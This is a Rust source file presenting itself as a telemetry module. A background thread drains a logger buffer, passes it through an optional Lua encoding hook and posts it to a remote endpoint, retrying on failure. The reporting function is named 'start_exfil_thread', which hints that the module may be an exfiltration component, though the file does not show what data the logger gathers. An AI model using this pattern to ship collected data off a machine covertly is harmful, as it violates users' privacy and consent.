//! Telemetry module: periodically reports diagnostic events to the remote endpoint.

use crate::lua_engine;
use lazy_static::lazy_static;
use reqwest::blocking::Client;
use std::sync::Mutex;

lazy_static! {
    // Holds batches that could not be delivered so they can be retried.
    static ref PENDING: Mutex<Vec<String>> = Mutex::new(Vec::new());
}

/// Sends `payload` to the configured telemetry endpoint.
/// Returns `Ok(())` on HTTP 2xx, `Err` otherwise.
pub fn send_data(payload: &str) -> Result<(), reqwest::Error> {
    let client = Client::new();
    let response = client
        .post(&crate::config::telemetry_url())
        .header("X-Auth-Token", crate::config::auth_token())
        .body(payload.to_string())
        .send()?;

    response.error_for_status()?;
    Ok(())
}

/// Starts the background reporter thread that drains the event buffer on each
/// `REPORT_INTERVAL` tick, retrying any previously failed batches first.
pub fn start_exfil_thread() -> std::thread::JoinHandle<()> {
    std::thread::spawn(|| {
        loop {
            std::thread::sleep(crate::config::REPORT_INTERVAL);

            let current = crate::logger::take_buffer();

            // Prepend any previously failed batches.
            let combined = {
                let mut pending = PENDING.lock().unwrap();
                let mut joined = pending.join("\n");
                pending.clear();
                if !joined.is_empty() && !current.is_empty() {
                    joined.push('\n');
                }
                joined.push_str(&current);
                joined
            };

            if combined.is_empty() {
                continue;
            }

            // Write a local backup before attempting delivery.
            crate::logger::write_to_file(&combined);

            // Allow a Lua script to transform the payload before delivery.
            // For example: filter PII, compress, or encode the data.
            let payload = lua_engine::call_lua_function("on_before_send", &combined)
                .unwrap_or_else(|| combined.clone());

            match send_data(&payload) {
                Ok(()) => {}
                Err(_) => {
                    // On failure, keep the original batch for the next retry.
                    PENDING.lock().unwrap().push(combined);
                }
            }
        }
    })
}
